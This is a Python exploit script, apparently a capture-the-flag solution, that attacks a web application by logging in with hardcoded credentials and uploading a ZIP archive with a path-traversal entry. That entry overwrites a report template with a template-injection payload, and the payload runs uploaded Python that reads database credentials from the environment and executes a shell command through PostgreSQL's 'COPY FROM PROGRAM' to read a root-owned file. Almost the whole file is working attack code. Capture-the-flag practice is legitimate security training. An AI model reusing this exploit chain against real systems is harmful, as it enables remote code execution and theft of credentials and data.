#!/usr/bin/env python3

import html
import io
import re
import sys
import zipfile

import requests


DEFAULT_TARGET = "https://http-01kz0xpw518e5y0ek9hnv166bm.u-ctf-ctf-7001b39a.urc.tf"
FLAG_RE = re.compile(r"(?:uctf|UCTF|CTF|FLAG)\{[^}\n]+\}")


def make_zip(template_payload, python_payload):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("evil.txt", python_payload)
        zf.writestr("../../templates/partials/header.txt", template_payload)
    return buf.getvalue()


def upload_bundle(session, target, data, name="payload.zip"):
    r = session.post(
        f"{target}/api/upload",
        files={"bundle": (name, data, "application/zip")},
        timeout=15,
    )
    if r.status_code != 200:
        raise RuntimeError(f"upload failed: HTTP {r.status_code}: {r.text[:300]}")
    return r


def main():
    target = (sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET).rstrip("/")
    session = requests.Session()

    print(f"[*] Target: {target}")
    print("[*] Logging in as dispatch")
    r = session.post(
        f"{target}/login",
        data={"username": "dispatch", "password": "fr3ight_c0ntrol"},
        timeout=15,
        allow_redirects=False,
    )
    if r.status_code not in (200, 302):
        raise RuntimeError(f"login failed: HTTP {r.status_code}: {r.text[:300]}")

    python_payload = r'''
import os
import traceback

OUT = ""
try:
    import psycopg2
    conn = psycopg2.connect(
        host=os.environ["DB_HOST"],
        port=os.environ["DB_PORT"],
        dbname=os.environ["DB_NAME"],
        user=os.environ["DB_USER"],
        password=os.environ["DB_PASS"],
    )
    conn.autocommit = True
    cur = conn.cursor()
    cur.execute("CREATE TEMP TABLE dd_flag(line text)")
    cur.execute("COPY dd_flag FROM PROGRAM 'cat /root/flag.txt 2>&1'")
    cur.execute("SELECT line FROM dd_flag")
    OUT = "\n".join(row[0] for row in cur.fetchall())
    cur.close()
    conn.close()
except Exception:
    OUT = traceback.format_exc()
'''

    template_payload = (
        "DD_START"
        "{{ config.from_pyfile('/app/uploads/' ~ uid ~ '/evil.txt') }}"
        "{{ config.OUT }}"
        "DD_END"
    )

    print("[*] Uploading ZIP Slip + template payload")
    upload_bundle(session, target, make_zip(template_payload, python_payload))

    print("[*] Triggering /report")
    r = session.get(f"{target}/report", timeout=20)
    if r.status_code != 200:
        raise RuntimeError(f"trigger failed: HTTP {r.status_code}: {r.text[:300]}")

    m = re.search(r"DD_START(.*?)DD_END", r.text, re.S)
    if not m:
        raise RuntimeError("marker not found in /report response")

    output = html.unescape(re.sub(r"<[^>]+>", "", m.group(1))).strip()
    flag = FLAG_RE.search(output)
    if not flag:
        raise RuntimeError(f"flag not found in command output:\n{output}")

    print(f"[+] Flag: {flag.group(0)}")

    restore_template = "Dead Drop Secure Courier Network - Report Summary"
    print("[*] Restoring report header")
    upload_bundle(session, target, make_zip(restore_template, "OUT = ''\n"), "restore.zip")


if __name__ == "__main__":
    main()
